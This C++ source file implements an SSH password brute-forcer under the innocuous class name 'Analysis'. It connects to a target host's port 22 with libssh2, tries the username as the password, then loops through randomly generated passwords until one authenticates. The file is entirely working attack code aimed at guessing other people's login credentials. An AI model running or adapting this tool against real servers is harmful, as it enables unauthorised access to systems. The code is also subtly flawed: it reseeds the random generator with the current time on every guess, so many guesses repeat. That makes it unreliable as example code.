#include "analysis.hpp"
#define AF_INET 2
#define SOCK_STREAM 1

Analysis::Analysis(std::string host, std::string id, const int length, const int num) {
    // initialize
    this->host = host;
    this->id = id;
	this->length = length;
	this->num = num;
    // initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
    }
    // initialize libssh2
    if (libssh2_init(0) != 0) {
        std::cerr << "libssh2 initialization failed\n";
    }
}

Analysis::~Analysis() {
    // finalize
    WSACleanup();
}

std::string Analysis::run() {
    std::string password;
    // create a session instance
    session = libssh2_session_init();
    if (!session) {
        std::cerr << "Could not initialize SSH session\n";
        return password;
    }
    // connect to the SSH server
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(22);
    if (inet_pton(AF_INET, this->host.c_str(), &sin.sin_addr.s_addr) <= 0) {
        std::cerr << "Invalid IP address format\n";
        libssh2_session_free(session);
        closesocket(sock);
        return password;
    }
    if (connect(sock, (struct sockaddr*)(&sin), sizeof(sin)) != 0) {
        std::cerr << "Failed to connect to " << this->host << "\n";
        libssh2_session_free(session);
        closesocket(sock);
        return password;
    }
    // start the session
    if (libssh2_session_handshake(session, sock)) {
        char *errmsg;
        int errlen;
        libssh2_session_last_error(session, &errmsg, &errlen, 0);
        std::cerr << "Failure establishing SSH session: " << std::string(errmsg, errlen) << "\n";
        libssh2_session_free(session);
        closesocket(sock);
        return password;
    }
    // authenticate using password
    password = this->id;
    if (libssh2_userauth_password(session, id.c_str(), password.c_str())) {
        std::cerr << "This was not the password: " << password << "\n";
        for (int i = 0; i < this->num; i++) {
            password = this->generate(this->length);
            if (libssh2_userauth_password(session, id.c_str(), password.c_str())) {
                char *errmsg;
                int errlen;
                libssh2_session_last_error(session, &errmsg, &errlen, 0);
                std::cerr << "Authentication by password failed: " << std::string(errmsg, errlen) << "\n";
			}
            else {
                std::cout << "Found the password!\n";
                break;
            }
        }
    }
	else {
        std::cout << "Found the password!\n";
	}
    // clean up session
    libssh2_session_disconnect(session, "Normal Shutdown");
    libssh2_session_free(session);
    closesocket(sock);
    return password;
}

std::string Analysis::generate(const int length) {
    srand(time(NULL));
    std::string tmp;
    std::string alphaNum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+";
    for (int i = 0; i < length; i++) {
        tmp += alphaNum[rand() % alphaNum.size()];
    }
    return tmp;
}

